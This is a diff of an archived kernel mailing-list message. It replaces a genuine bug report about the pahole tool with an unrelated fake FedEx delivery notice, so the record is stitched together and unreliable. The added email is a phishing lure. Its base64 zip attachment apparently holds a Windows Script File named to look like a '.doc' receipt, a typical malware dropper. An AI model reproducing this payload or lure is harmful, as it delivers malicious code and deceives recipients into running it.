@@ -1,27 +1,106 @@
-From: David Beaulieu <david.beaulieu-UF6BFNFdnjXQT0dZR+AlfA@public.gmane.org>
-Subject: 16-bit id's in =?utf-8?b?Y3VfZm9yX2VhY2g=?= loops cause infinite loops with large libraries
-Date: Mon, 18 Jul 2016 18:13:23 +0000 (UTC)
-Message-ID: <loom.20160718T200805-633@post.gmane.org>
+From: "FedEx TechConnect" <darryl.fletcher-bT4o9o+0S4Lta4EC/59zMGD2FQJk+8+b@public.gmane.org>
+Subject: Parcel 000633080 delivery notification, FedEx
+Date: Mon, 16 Jan 2017 14:59:59 +0000
+Message-ID: <0ffae34e3a594fa61f395eed1b0a73e9@printingresearch.org>
+Reply-To: "FedEx TechConnect" <darryl.fletcher-bT4o9o+0S4Lta4EC/59zMGD2FQJk+8+b@public.gmane.org>
 Mime-Version: 1.0
-Content-Type: text/plain; charset=us-ascii
-Content-Transfer-Encoding: 7bit
+Content-Type: multipart/mixed;
+        boundary="b1_02d8c7de2166d32d4342f499af9e67a6"
+Content-Transfer-Encoding: 8bit
 Return-path: <dwarves-owner-u79uwXL29TY76Z2rM5mHXA@public.gmane.org>
 Sender: dwarves-owner-u79uwXL29TY76Z2rM5mHXA@public.gmane.org
 To: dwarves-u79uwXL29TY76Z2rM5mHXA@public.gmane.org
 List-Id: dwarves@vger.kernel.org
 
-Hello,
+--b1_02d8c7de2166d32d4342f499af9e67a6
+Content-Type: text/plain; charset=us-ascii
 
-I'm new to pahole (great tool!)... I downloaded the latest git source 
-(b52386d041fac2dc6decf3a9e8e85385784a2de9) and tried to run it against a 
-large library from my project. It got caught in an infinite loop in 
-cu__find_base_type_by_sname_and_size() in the call to cu__for_each_type(). 
-The reason was the uint16_t id was not big enough... it wraps around and 
-is always less than cu->types_table.nr_entries. I changed it (and other 
-instances of it in dwarves.c) to uint32_t, and that seems to have fixed 
-the issue, but I don't know if there are any other side effects.
+Dear Customer,
 
-Anyway, hope this helps!
+FedEx courier was unable to contact you for your parcel delivery.
+
+You can find more details in this e-mail attachment!
+
+Thanks,
+Darryl Fletcher,
+Parcels Delivery Manager.
+
+
+--b1_02d8c7de2166d32d4342f499af9e67a6
+Content-Type: application/zip; name="Delivery-Receipt-000633080.zip"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename=Delivery-Receipt-000633080.zip
+
+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
+SwUGAAAAAAIAAgCTAAAAHg4AAAAA
+
+
+--b1_02d8c7de2166d32d4342f499af9e67a6--
 
 --
 To unsubscribe from this list: send the line "unsubscribe dwarves" in
